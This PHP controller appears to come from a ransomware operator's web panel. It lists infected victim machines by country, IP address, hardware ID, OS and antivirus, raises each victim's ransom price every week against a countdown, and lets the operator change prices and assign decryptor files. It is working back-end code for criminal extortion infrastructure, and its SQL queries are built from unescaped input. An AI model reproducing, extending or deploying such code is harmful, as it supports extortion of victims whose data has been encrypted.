<?php
/**
 * Created by PhpStorm.
 * User: wolf
 * Date: 10/6/14
 * Time: 2:26 AM
 */

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class main extends CI_Controller {

    public $data;
    public $devices;

    public function __construct(){
        parent::__construct();
        $this->login_model->login();
        // Page loading custom data
        $data = $this->lang_model->get_textdata();
        $data['page'] = 'ransomslist';
        $data['theme_url'] = base_url().THEME_URL.CURRENT_THEME_NAME;
        $data['userdata'] = $this->login_model->get_cur_user_info();
        $data['menu_url'] = base_url()."index/menu";
        $data['title'] = "Ransoms List";
        $this->data = $data;
    }

    public function index()
    {
        $this->data['userdata'] = $this->user_model->get_user($this->data['userdata']['member_id']);
        $this->getAllDevices();
        // load view content
        $this->page_model->get_header($this->data);
        $this->page_model->get_sidebar($this->data);
        $this->page_model->get_content($this->data);
        $this->page_model->get_footer($this->data);
    }

    public function getAllDevices(){
        $filters = array(
            "country" => $this->input->get('country'),
            "ipaddress" => $this->input->get('ipaddress'),
            "hwid" => $this->input->get('hwid'),
            "crc32" => $this->input->get('crc32'),
            "price" => $this->input->get('price'),
            "createdAt" => $this->input->get('createdAt'),
            "os" => $this->input->get('os'),
            "test" => $this->input->get('test'),
            "status" => $this->input->get('status'),
        );
        $this->data['filters'] = $filters;

        $CI =   & get_instance();
        $query = "select * from device_tb where owner='".$this->data['userdata']->member_key."';";
        $results = $CI->db->query($query)->result();
        $this->devices = array();

        foreach($results as $device){
            if(
                ($filters['country']    == '' || strpos($device->country ,      $filters['country']) !== false) &&
                ($filters['ipaddress']  == '' || strpos($device->ipaddress ,    $filters['ipaddress']) !== false) &&
                ($filters['hwid']       == '' || strpos($device->hwid ,         $filters['hwid']) !== false) &&
                ($filters['createdAt']       == '' || strpos($device->createdAt ,         $filters['createdAt']) !== false) &&
                ($filters['os']         == '' || strpos($device->os ,           $filters['os']) !== false) &&
                ($filters['test']       == '' || strpos($device->av ,           $filters['test']) !== false) &&
                ($filters['status']     == '' || strpos($device->status ,           $filters['status']) !== false)
            ){
                array_push($this->devices , $this->calRemaining($device));
            }
        }
    }

    public function calRemaining($dev){
        $dev->remaining = (new DateTime(date( "Y-m-d\TH:i:sO",$dev->createdAt)))->diff(new DateTime());

        $dev->price = $dev->discount * floor($dev->remaining->d / 7 + 1) ;

        $dev->remaining->d = 6 - $dev->remaining->d % 7;
        $dev->remaining->h = 23 - $dev->remaining->h;
        $dev->remaining->i = 59 -$dev->remaining->i;
        $dev->remaining->s = 59 -  $dev->remaining->s;

        return $dev;
    }

    public function ajax_call(){
        /**
         * Get Ajax Request Parameters
         */
        //ajax call

        $userdata = $this->user_model->get_user($this->data['userdata']['member_id']);
        $action  =   $this->input->get_post('action') ;
        $data   =   $this->input->get_post('data');


        switch($action){
            case "edit_price":
                $CI =   & get_instance();
                $query = "update device_tb set discount='".$data['price']."' where hwid='".$data['hwid']."';";
                $result = $CI->db->query($query);
                echo json_encode($result);
                die();
            case "update_decryptor":
                    $CI =   & get_instance();
                    $query = "update device_tb set decryptor='".$data['filename']."' where hwid='".$data['hwid']."';";
                    $result = $CI->db->query($query);
                    echo json_encode($result);
                die();
        }

        require_once FCPATH."ui/server/pages/ransomlist.php";
    }

}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */
